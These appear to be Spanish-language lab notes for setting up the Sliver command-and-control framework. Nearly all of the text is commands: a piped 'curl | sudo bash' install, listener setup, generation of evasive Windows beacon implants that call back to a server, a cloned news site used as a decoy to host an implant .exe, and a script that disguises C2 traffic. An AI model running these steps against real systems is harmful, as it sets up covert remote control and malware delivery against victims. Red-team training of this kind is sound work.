# Instalación 

$ apt update
$ curl https://sliver.sh/install | sudo bash
$ systemctl daemon-reload
$ sliver

# Configuración

## Listeners

$ apt install net-tools -y
$ netstat -atun 
$ sliver
sliver > http 
sliver > https 
sliver > mtls 
sliver > exit

$ netstat -atun


## Perfiles e Implantes

sliver > profiles new beacon --arch amd64 --os windows --mtls <IP SERVIDOR>:8888 -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 C2OP_sesion_shellcode

sliver > profiles new --arch amd64 --os windows --mtls <IP SERVIDOR>:8888 -f shellcode --evasion C2OP_beacon_shellcode

sliver > profile generate C2OP_sesion_shellcode

sliver > profiles new --arch amd64 --os windows --http <IP SERVIDOR>:443 -f exe --evasion C2OP_sesion_exe

sliver > profiles new beacon --arch amd64 --os windows --http <IP SERVIDOR>:443 -f exe --evasion --timeout 300 --seconds 5 --jitter 1 C2OP_beacon_exe

sliver > profile generate C2OP_beacon_exe


## Websites

$ wget https://www.nytimes.com/ -O index.html
sliver > websites add-content --website blog --web-path / --content ./index.html
sliver > jobs -K
sliver > http -w blog
sliver > https -w blog

### Publicando Implantes

websites add-content --website blog --web-path /implante --content ./POTENTIAL_JUNKET.exe

```
Descarga un implente beacon y session ejecuta en tu equipo y revisa el comportamiento con process hacker.
```

## Modificando el tráfico

$ wget https://raw.githubusercontent.com/vsh00t/SliverConfig/refs/heads/main/http-c2-generator.py
$ python3 http-c2-generator.py
$ systemctl restart sliver
$ tail -f /root/.sliver/logs/sliver.log
